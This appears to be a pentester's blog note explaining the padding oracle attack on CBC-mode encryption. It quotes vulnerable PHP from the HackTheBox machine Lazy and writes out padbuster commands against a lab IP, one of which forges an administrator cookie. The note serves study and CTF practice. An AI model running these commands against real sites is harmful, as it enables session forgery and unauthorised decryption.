---
layout: post
title: Padding Oracle Attack
tags: [web,crypto,foothold]
minute: 1
---
## Overview
CBD mode PKCS7 format uses padding to complete the block length when encrypting plaintext.

![](/assets/Padding Oracle Attack/padding.png)

Attacker can leverage this behaviour to get the plaintext by manipulating the ciphertext byte by byte in a trial and error fashion and observing whether the application will return error (invalid padding) or success (valid padding).

This kind of crypto may be safe but the real attack surface is on whether your app is returning error on invalid padding which will give an attacker chance to brute force the correct plaintext.

```php
// example file from HTB lazy
function decryptString($encryptedText, $passphrase) {
  $encrypted = base64_decode($encryptedText);
  $iv_size =  mcrypt_get_iv_size(MCRYPT_DES, MCRYPT_MODE_CBC);
  $iv = substr($encrypted,0,$iv_size);
  $dec = mcrypt_decrypt(MCRYPT_DES, $passphrase, substr($encrypted,$iv_size), MCRYPT_MODE_CBC, $iv);
  $str = pkcs5_unpad($dec);
  if ($str === false) {
    echo "Invalid padding"; // really? you want to be hacked?
    die();                  // maybe let's replace that or
  }                         // remove entirely?
  else {
    return $str;
  }
}
```

This is also a type of CCA or Chosen Ciphertext Attack.

## Details on ciphertext manipulation
Go to "The Theory" part of this [link](https://pentesterlab.com/exercises/padding_oracle/course).

## Detection
* Try manipulating cookie values. See if webapp will error response such as `invalid padding` or `500`,

## Exploitation
* Using padbuster

```bash
# installation
sudo apt-get install padbuster

# detection
padbuster http://10.10.10.10/index.php "RVJDQrwUdTRWJUVUeBKkEA==" 8 -encoding 0 -cookies "login=RVJDQrwUdTRWJUVUeBKkEA=="

# gets an admin cookie
padbuster http://10.10.10.10/index.php "RVJDQrwUdTRWJUVUeBKkEA==" 8 -encoding 0 -cookies "login=RVJDQrwUdTRWJUVUeBKkEA==" -plaintext "user=administrator"
```

* Using [bit flippingattack](https://0xdf.gitlab.io/2020/07/29/htb-lazy.html#path-2-bit-flip-attack). Here is another resource from [ippsec](https://www.youtube.com/watch?v=3VxZNflJqsw&t=460s) using Burp.

## References
* [Padding Oracle - HackTricks](https://book.hacktricks.xyz/cryptography/padding-oracle-priv#padding-oracle)
* [HTB Lazy](https://www.youtube.com/watch?v=3VxZNflJqsw)
* [Mathematical Explanation](https://www.youtube.com/watch?v=aH4DENMN_O4&t=873s)
* [The Padding Oracle Attack](https://robertheaton.com/2013/07/29/padding-oracle-attack/)
